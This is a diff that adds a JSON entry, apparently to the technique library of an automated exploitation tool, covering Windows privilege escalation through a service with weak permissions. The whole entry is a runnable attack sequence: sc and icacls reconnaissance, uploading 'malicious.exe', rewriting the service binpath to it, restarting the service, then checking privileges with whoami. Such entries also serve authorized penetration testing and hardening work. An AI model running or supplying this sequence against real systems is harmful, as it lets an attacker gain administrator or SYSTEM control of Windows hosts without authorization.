@@ -1,0 +1,18 @@
+{
+  "id": "win_weak_service_acl",
+  "category": "WIN_WEAK_SERVICE",
+  "binary": null,
+  "cve": null,
+  "exploitation": [
+    "exec <id> sc qc {{binary}}",
+    "exec <id> icacls \"<service binary path>\"",
+    "upload <id> /path/to/malicious.exe",
+    "exec <id> sc config {{binary}} binpath= \"C:\\Windows\\Temp\\malicious.exe\"",
+    "exec <id> sc stop {{binary}} && sc start {{binary}}"
+  ],
+  "post_exploit": ["exec <id> whoami"],
+  "notes": "Identify writable service binary with: accesschk.exe -uwcqv * or icacls on the binary path. Replace binary, restart service.",
+  "source": "book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation",
+  "tags": ["windows", "service", "acl", "binary-hijack"],
+  "severity": "high"
+}
